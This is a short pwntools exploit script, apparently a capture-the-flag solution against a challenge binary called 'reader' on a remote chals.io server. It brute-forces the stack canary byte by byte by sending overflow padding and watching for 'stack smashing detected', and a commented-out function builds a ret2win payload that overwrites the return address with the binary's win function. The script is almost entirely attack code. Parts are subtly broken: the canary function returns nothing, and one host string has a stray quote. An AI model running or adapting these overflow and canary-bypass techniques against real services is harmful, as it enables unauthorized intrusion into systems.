#!/usr/bin/python3

from pwn import *
import time
context.binary = exe = ELF('./reader',checksec=False)

def brute_canary():
    p = remote('0.cloud.chals.io', 10677)
    payload = 'a'*72
    canary = '\x00'
    for step in range(0,7):
        for i in range(0,256):
            time.sleep(0.3)
            sent = payload + canary + chr(i)
            p.send(sent)
            p.recvline()
            test = p.recvline()

            if b'stack smashing detected' in test:
                p.close()
                p.clean()
                p = remote('0.cloud.chals.io', 10677)
            elif b'stack smashing detected' not in test:
                canary += chr(i)
                break




#def get_shell():
        #p = remote("0.cloud.chals.io'",10677)
        #payload = b'a'*72 +p64(brute_canary())+ b'a'*8 + p64(exe.sym.win)

       # p.sendafter(b'data: ',payload)
    #    p.interactive()
brute_canary()
